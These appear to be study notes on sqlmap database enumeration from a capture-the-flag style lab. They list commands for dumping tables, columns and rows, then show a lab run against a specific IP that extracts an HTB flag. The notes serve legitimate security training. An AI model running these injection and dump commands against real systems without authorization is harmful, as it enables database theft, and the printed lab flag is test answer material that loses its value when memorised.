# Database Enumeration

Example of MYSQL config in sqlmap :

<?xml version="1.0" encoding="UTF-8"?>

<root>
    <dbms value="MySQL">
        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
        <cast query="CAST(%s AS NCHAR)"/>
        <length query="CHAR_LENGTH(%s)"/>
        <isnull query="IFNULL(%s,' ')"/>
...SNIP...
        <banner query="VERSION()"/>


So if we want to retrieve the "banner" (switch --banner) for the target based on MySQL DBMS, the VERSION() query will be used for such purpose.

Basic DB Data Enumeration
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba

Table Enumeration
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb

Table/Row Enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3

Conditional Enumeration
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

Full DB Enumeration
--dump-all
--exclude-sysdbs

## LAB

94.237.62.195:57826

sqlmap -u 'http://94.237.62.195:57826/case1.php?id=1' --tables -D testdb

Database: testdb
[2 tables]
+-------+
| flag1 |
| users |
+-------+

sqlmap -u 'http://94.237.62.195:57826/case1.php?id=1' --dump -T flag1 -D testdb

Database: testdb
Table: flag1
[1 entry]
+----+-----------------------------------------------------+
| id | content                                             |
+----+-----------------------------------------------------+
| 1  | HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} |
+----+-----------------------------------------------------+
